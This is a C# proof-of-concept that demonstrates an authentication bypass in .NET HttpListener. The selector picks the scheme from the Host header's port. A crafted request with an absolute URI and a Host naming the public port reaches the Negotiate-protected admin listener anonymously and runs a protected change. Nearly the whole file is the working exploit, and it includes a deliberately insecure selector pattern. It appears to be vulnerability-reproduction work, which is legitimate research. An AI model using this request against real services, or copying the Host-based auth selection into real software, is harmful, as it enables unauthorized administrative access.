using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class Program
{
    private static readonly string SideEffectPath =
        Path.Combine(Path.GetTempPath(), "httplistener-cross-port-negotiate-91e4.txt");

    static int FreePort()
    {
        using var l = new TcpListener(IPAddress.Loopback, 0);
        l.Start();
        int p = ((IPEndPoint)l.LocalEndpoint).Port;
        l.Stop();
        return p;
    }

    static void Require(bool condition, string message)
    {
        if (!condition) throw new Exception("ASSERTION_FAILED: " + message);
    }

    static async Task<string> Exchange(int port, string request, Func<Task>? onContext)
    {
        using var client = new TcpClient();
        await client.ConnectAsync(IPAddress.Loopback, port);
        using NetworkStream ns = client.GetStream();

        await ns.WriteAsync(Encoding.ASCII.GetBytes(request));
        await ns.FlushAsync();

        Task? server = onContext?.Invoke();

        using var ms = new MemoryStream();
        byte[] buf = new byte[4096];
        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
        try
        {
            while (true)
            {
                int n = await ns.ReadAsync(buf, cts.Token);
                if (n == 0) break;
                await ms.WriteAsync(buf.AsMemory(0, n), cts.Token);
            }
        }
        catch (OperationCanceledException) { }

        if (server is not null)
            await Task.WhenAny(server, Task.Delay(1000));

        return Encoding.ASCII.GetString(ms.ToArray());
    }

    static async Task Main()
    {
        Console.WriteLine($"FRAMEWORK={RuntimeInformation.FrameworkDescription}");
        Console.WriteLine($"OS={RuntimeInformation.OSDescription}");

        try { File.Delete(SideEffectPath); } catch { }

        int publicPort = FreePort();
        int adminPort = FreePort();
        while (adminPort == publicPort) adminPort = FreePort();

        using var publicListener = new HttpListener();
        using var adminListener = new HttpListener();

        publicListener.Prefixes.Add($"http://app.test:{publicPort}/public/");
        adminListener.Prefixes.Add($"http://app.test:{adminPort}/admin/");
        publicListener.AuthenticationSchemes = AuthenticationSchemes.Anonymous;

        int selectorCalls = 0;
        AuthenticationSchemes selected = AuthenticationSchemes.None;
        string selectorUserHost = "<not-called>";
        string selectorUrlAuthority = "<not-called>";

        adminListener.AuthenticationSchemes = AuthenticationSchemes.None;
        adminListener.AuthenticationSchemeSelectorDelegate = request =>
        {
            Interlocked.Increment(ref selectorCalls);
            selectorUserHost = request.UserHostName ?? "<null>";
            selectorUrlAuthority = request.Url?.Authority ?? "<null>";

            int colon = selectorUserHost.LastIndexOf(':');
            int seenPort = colon >= 0 &&
                int.TryParse(selectorUserHost[(colon + 1)..], out int parsed)
                    ? parsed : -1;

            selected = seenPort == publicPort
                ? AuthenticationSchemes.Anonymous
                : AuthenticationSchemes.Negotiate;

            Console.WriteLine(
                $"SELECTOR UserHostName={selectorUserHost} UrlAuthority={selectorUrlAuthority} SeenPort={seenPort} PublicPort={publicPort} AdminPort={adminPort} Selected={selected}");
            return selected;
        };

        publicListener.Start();
        adminListener.Start();

        // Control: direct admin authority must require Windows integrated authentication.
        selectorCalls = 0;
        selected = AuthenticationSchemes.None;
        Task<HttpListenerContext> controlContext = adminListener.GetContextAsync();

        string controlRaw =
            $"POST /admin/change HTTP/1.1\r\n" +
            $"Host: app.test:{adminPort}\r\n" +
            "Content-Length: 0\r\n" +
            "Connection: close\r\n\r\n";

        string controlWire = await Exchange(adminPort, controlRaw, null);
        string controlFirst = controlWire.Split(new[] {"\r\n","\n"}, StringSplitOptions.None)[0];
        bool negotiateChallenge =
            controlWire.Contains("WWW-Authenticate: Negotiate", StringComparison.OrdinalIgnoreCase);

        Console.WriteLine(
            $"CONTROL first={controlFirst} challenge={negotiateChallenge} context={controlContext.IsCompletedSuccessfully} selected={selected} UserHostName={selectorUserHost} UrlAuthority={selectorUrlAuthority}");

        Require(controlFirst.Contains("401"), "admin control must be 401");
        Require(negotiateChallenge, "admin control must challenge with Negotiate");
        Require(selected == AuthenticationSchemes.Negotiate, "admin control must select Negotiate");
        Require(!controlContext.IsCompletedSuccessfully, "unauthenticated admin control must not deliver context");

        adminListener.Close();

        // Fresh listeners for attack so no pending control operation can contaminate the observation.
        using var publicListener2 = new HttpListener();
        using var adminListener2 = new HttpListener();
        publicListener2.Prefixes.Add($"http://app.test:{publicPort}/public/");
        adminListener2.Prefixes.Add($"http://app.test:{adminPort}/admin/");
        publicListener2.AuthenticationSchemes = AuthenticationSchemes.Anonymous;

        selectorCalls = 0;
        selected = AuthenticationSchemes.None;
        selectorUserHost = "<not-called>";
        selectorUrlAuthority = "<not-called>";

        adminListener2.AuthenticationSchemes = AuthenticationSchemes.None;
        adminListener2.AuthenticationSchemeSelectorDelegate = request =>
        {
            Interlocked.Increment(ref selectorCalls);
            selectorUserHost = request.UserHostName ?? "<null>";
            selectorUrlAuthority = request.Url?.Authority ?? "<null>";

            int colon = selectorUserHost.LastIndexOf(':');
            int seenPort = colon >= 0 &&
                int.TryParse(selectorUserHost[(colon + 1)..], out int parsed)
                    ? parsed : -1;

            selected = seenPort == publicPort
                ? AuthenticationSchemes.Anonymous
                : AuthenticationSchemes.Negotiate;

            Console.WriteLine(
                $"ATTACK_SELECTOR UserHostName={selectorUserHost} UrlAuthority={selectorUrlAuthority} SeenPort={seenPort} PublicPort={publicPort} AdminPort={adminPort} Selected={selected}");
            return selected;
        };

        publicListener2.Start();
        adminListener2.Start();

        Task<HttpListenerContext> publicTask = publicListener2.GetContextAsync();
        Task<HttpListenerContext> adminTask = adminListener2.GetContextAsync();

        string attackRaw =
            $"POST http://app.test:{publicPort}/admin/change HTTP/1.1\r\n" +
            $"Host: app.test:{publicPort}\r\n" +
            "Content-Length: 0\r\n" +
            "Connection: close\r\n\r\n";

        async Task HandleAttack()
        {
            HttpListenerContext ctx = await adminTask.WaitAsync(TimeSpan.FromSeconds(5));
            Console.WriteLine(
                $"ADMIN_CONTEXT LocalPort={ctx.Request.LocalEndPoint.Port} UserHostName={ctx.Request.UserHostName} UrlAuthority={ctx.Request.Url?.Authority} User={(ctx.User is null ? "ANONYMOUS" : "AUTHENTICATED")}");

            File.WriteAllText(SideEffectPath, "NEGOTIATE_PROTECTED_ADMIN_CHANGE_EXECUTED");

            byte[] body = Encoding.ASCII.GetBytes("NEGOTIATE_ADMIN_CHANGE_EXECUTED_91e4\n");
            ctx.Response.StatusCode = 200;
            ctx.Response.ContentLength64 = body.Length;
            await ctx.Response.OutputStream.WriteAsync(body);
            ctx.Response.Close();
        }

        string attackWire = await Exchange(adminPort, attackRaw, HandleAttack);
        string attackFirst = attackWire.Split(new[] {"\r\n","\n"}, StringSplitOptions.None)[0];
        bool attackChallenge =
            attackWire.Contains("WWW-Authenticate: Negotiate", StringComparison.OrdinalIgnoreCase);

        Console.WriteLine(
            $"ATTACK first={attackFirst} challenge={attackChallenge} publicContext={publicTask.IsCompletedSuccessfully} adminContext={adminTask.IsCompletedSuccessfully} selected={selected} UserHostName={selectorUserHost} UrlAuthority={selectorUrlAuthority} sideEffect={File.Exists(SideEffectPath)}");

        Require(attackFirst.Contains("200"), "cross-port attack must get 200");
        Require(!attackChallenge, "cross-port attack must suppress Negotiate challenge");
        Require(selected == AuthenticationSchemes.Anonymous, "cross-port attack must downgrade to Anonymous");
        Require(!publicTask.IsCompletedSuccessfully, "public listener must not receive attack");
        Require(adminTask.IsCompletedSuccessfully, "protected admin listener must receive attack");
        Require(selectorUserHost.EndsWith($":{publicPort}", StringComparison.Ordinal),
            "selector must observe public port");
        Require(selectorUrlAuthority.EndsWith($":{adminPort}", StringComparison.Ordinal),
            "request Url must identify physical admin port");
        Require(File.Exists(SideEffectPath), "protected state change side effect must execute");
        Require(File.ReadAllText(SideEffectPath) == "NEGOTIATE_PROTECTED_ADMIN_CHANGE_EXECUTED",
            "side effect marker must match");

        Console.WriteLine($"PUBLIC_PORT={publicPort}");
        Console.WriteLine($"ADMIN_PORT={adminPort}");
        Console.WriteLine($"SIDE_EFFECT_PATH={SideEffectPath}");
        Console.WriteLine("CROSS_PORT_NEGOTIATE_AUTH_BYPASS=CONFIRMED");
    }
}
